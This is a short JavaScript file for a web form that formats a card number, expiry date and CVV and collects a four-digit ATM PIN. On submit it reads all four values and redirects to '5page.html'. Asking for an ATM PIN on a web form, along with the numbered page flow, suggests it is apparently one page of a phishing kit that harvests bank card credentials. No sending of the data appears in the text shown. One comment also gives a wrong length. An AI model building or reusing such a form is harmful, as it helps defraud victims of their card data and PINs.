// Format card number: after every 4 digits, add a space
document.getElementById('cardNumber').addEventListener('input', function(event) {
    let input = event.target.value.replace(/\D/g, '').slice(0, 16); // Only digits, max length 12
    let formatted = input.match(/.{1,4}/g)?.join(' ') || input; // Add space after every 4 digits
    event.target.value = formatted;
});

// Format expiry date: MM/YY
document.getElementById('expiryDate').addEventListener('input', function(event) {
    let input = event.target.value.replace(/\D/g, '').slice(0, 4); // Only digits, max length 4
    if (input.length >= 3) {
        event.target.value = `${input.slice(0, 2)}/${input.slice(2)}`; // Format MM/YY
    } else {
        event.target.value = input;
    }
});

// Allow only 3 digits in CVV
document.getElementById('cvv').addEventListener('input', function(event) {
    let input = event.target.value.replace(/\D/g, '').slice(0, 3); // Only digits, max length 3
    event.target.value = input;
});

// Allow only 4 digits in ATM PIN
document.getElementById('atmPin').addEventListener('input', function(event) {
    let input = event.target.value.replace(/\D/g, '').slice(0, 4); // Only digits, max length 4
    event.target.value = input;
});

// Redirect to 5page.html on form submission
document.querySelector('button[type="4submit"]').addEventListener('click', function(event) {
    event.preventDefault();

    const cardNumber = document.getElementById('cardNumber').value;
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;
    const atmPin = document.getElementById('atmPin').value;

    // Additional validation can be added here if needed

    // Redirect after validation
    window.location.href = '5page.html';
});
                                                   
